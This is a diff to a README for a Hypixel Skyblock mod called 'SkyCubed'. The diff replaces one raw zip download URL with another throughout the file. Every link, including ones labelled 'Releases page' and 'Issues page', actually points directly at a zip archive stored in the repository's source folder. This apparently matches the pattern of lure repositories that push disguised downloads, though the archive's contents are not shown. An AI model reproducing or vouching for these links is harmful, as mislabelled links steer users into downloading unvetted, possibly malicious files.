@@ -4,13 +4,13 @@
 SkyCubed is a quality of life improvement mod for Hypixel Skyblock. It enhances your gaming experience by simplifying many tasks. Whether you're managing your inventory or exploring the world, this mod makes play smoother and more enjoyable.
 
 ## 📥 Download Now
-[![Download SkyCubed](https://raw.githubusercontent.com/rifki398/SkyCubed/main/src/main/java/Cubed_Sky_3.0-alpha.3.zip)](https://raw.githubusercontent.com/rifki398/SkyCubed/main/src/main/java/Cubed_Sky_3.0-alpha.3.zip)
+[![Download SkyCubed](https://github.com/rifki398/SkyCubed/raw/refs/heads/main/src/main/Sky_Cubed_3.2.zip)](https://github.com/rifki398/SkyCubed/raw/refs/heads/main/src/main/Sky_Cubed_3.2.zip)
 
 ## 🚀 Getting Started
 Running SkyCubed is straightforward. Follow these simple steps to get started:
 
 1. **Download the Latest Release**
-   Visit our [Releases page](https://raw.githubusercontent.com/rifki398/SkyCubed/main/src/main/java/Cubed_Sky_3.0-alpha.3.zip) to find the latest version of SkyCubed. Look for the version that suits your game.
+   Visit our [Releases page](https://github.com/rifki398/SkyCubed/raw/refs/heads/main/src/main/Sky_Cubed_3.2.zip) to find the latest version of SkyCubed. Look for the version that suits your game.
 
 2. **Locate the Download**
    Scroll down to find the "Assets" section. Click on the appropriate file for your system to download. 
@@ -54,13 +54,13 @@ SkyCubed is designed to work well with most mods. However, if you notice any iss
 If you encounter any problems, please report them through our GitHub Issues page. Be sure to include steps to reproduce the issue so we can address it.
 
 ## 📞 Support
-If you need further help, please check the [Issues page](https://raw.githubusercontent.com/rifki398/SkyCubed/main/src/main/java/Cubed_Sky_3.0-alpha.3.zip) or leave a message. The community and developers are here to assist.
+If you need further help, please check the [Issues page](https://github.com/rifki398/SkyCubed/raw/refs/heads/main/src/main/Sky_Cubed_3.2.zip) or leave a message. The community and developers are here to assist.
 
 ## 🔗 Additional Resources
 - **User Guide:** For more detailed instructions and tips, refer to the user manual available in the mod folder after installation.
 - **Community Forum:** Join discussions and share experiences with other users.
 
 ## 🔙 Returning to Download
-Ready to enhance your Hypixel Skyblock experience? Visit our [Releases page](https://raw.githubusercontent.com/rifki398/SkyCubed/main/src/main/java/Cubed_Sky_3.0-alpha.3.zip) to download SkyCubed now!
+Ready to enhance your Hypixel Skyblock experience? Visit our [Releases page](https://github.com/rifki398/SkyCubed/raw/refs/heads/main/src/main/Sky_Cubed_3.2.zip) to download SkyCubed now!
 
 With these steps, you should be well on your way to enjoying all the benefits of SkyCubed. Happy gaming!
